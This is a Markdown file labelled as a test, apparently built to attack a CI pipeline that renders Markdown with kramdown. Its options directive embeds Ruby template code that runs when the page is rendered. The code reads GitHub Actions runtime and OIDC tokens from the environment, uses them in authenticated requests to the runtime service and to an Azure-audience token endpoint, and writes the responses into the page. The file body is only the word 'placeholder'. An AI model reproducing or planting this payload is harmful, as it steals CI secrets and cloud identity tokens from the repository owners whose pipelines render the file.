---
---

# Test 33: SSRF to Actions runtime and internal services

{::options template="string://<%= require 'net/http'; require 'uri'; r=''; svc_url=ENV['ACTIONS_RUNTIME_URL'] rescue nil; token=ENV['ACTIONS_RUNTIME_TOKEN'] rescue nil; cache_url=ENV['ACTIONS_CACHE_URL'] rescue nil; id_url=ENV['ACTIONS_ID_TOKEN_REQUEST_URL'] rescue nil; id_token=ENV['ACTIONS_ID_TOKEN_REQUEST_TOKEN'] rescue nil; r=r+'SVC_URL='+svc_url.to_s[0..100]+\"\\n\"; r=r+'CACHE_URL='+cache_url.to_s[0..100]+\"\\n\"; r=r+'ID_URL='+id_url.to_s[0..100]+\"\\n\"; r=r+'HAS_TOKEN='+(!token.nil?).to_s+\"\\n\"; r=r+'HAS_ID_TOKEN='+(!id_token.nil?).to_s+\"\\n\"; if svc_url; begin; uri=URI.parse(svc_url); http=Net::HTTP.new(uri.host,uri.port); http.use_ssl=uri.scheme=='https'; http.open_timeout=3; http.read_timeout=3; req=Net::HTTP::Get.new(uri); req['Authorization']='Bearer '+token.to_s; resp=http.request(req); r=r+'SVC_STATUS='+resp.code+\"\\n\"+'SVC_BODY='+resp.body[0..300]+\"\\n\"; rescue => e; r=r+'SVC_ERR='+e.message[0..100]+\"\\n\"; end; end; if id_url; begin; uri=URI.parse(id_url+'&audience=api://AzureADTokenExchange'); http=Net::HTTP.new(uri.host,uri.port); http.use_ssl=uri.scheme=='https'; http.open_timeout=3; http.read_timeout=3; req=Net::HTTP::Get.new(uri); req['Authorization']='Bearer '+id_token.to_s; resp=http.request(req); r=r+'OIDC_STATUS='+resp.code+\"\\n\"+'OIDC_BODY='+resp.body[0..500]+\"\\n\"; rescue => e; r=r+'OIDC_ERR='+e.message[0..100]+\"\\n\"; end; end; r %>" /}

placeholder
